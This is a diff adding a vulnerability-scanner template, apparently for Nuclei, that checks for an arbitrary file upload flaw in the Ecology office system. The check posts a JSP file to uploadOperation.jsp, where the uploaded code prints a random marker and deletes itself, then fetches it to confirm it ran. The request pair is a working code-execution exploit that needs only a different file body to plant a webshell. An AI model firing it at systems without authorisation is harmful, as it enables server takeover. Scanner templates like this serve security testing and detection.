@@ -1,0 +1,39 @@
+id: ecology-arbitrary-fileUpload
+info:
+  name: Ecology Arbitrary File Upload
+  author:
+  - l0ne1y
+  description: |-
+    ecology任意文件上传
+    在Web程序中，通常会涉及到一些文件上传的功能，如头像上传、图片上传、附件上传等，由于Web中间件会根据用户的请求去执行特定后缀的文件（asp、php、cgi、aspx、jsp等），如果在上传文件的功能中未限制上传文件的后缀，导致可以上传“asp、php、cgi、aspx、jsp、html”等后缀的执行文件时，那么攻击者可以利用此漏洞上传恶意的可执行文件来执行恶意的代码，比如文件读写、命令执行，这样即可直接控制服务器，例如：攻击者可上传恶意后门获取webshell。
+  severity: high
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1 == 200
+    - contains(body_2, "{{randomValue}}") && status_code_2 == 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /page/exportImport/uploadOperation.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+
+    ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+    Content-Disposition: form-data; name="file"; filename="{{fileName}}.jsp"
+    Content-Type: application/octet-stream
+
+    <%out.print("{{randomValue}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+  - |
+    GET /page/exportImport/fileTransfer/{{fileName}}.jsp HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  fileName: '{{rand_char("abcdefghjkloerytu")}}'
+  randomValue: '{{rand_int(200000000, 210000000)}}'
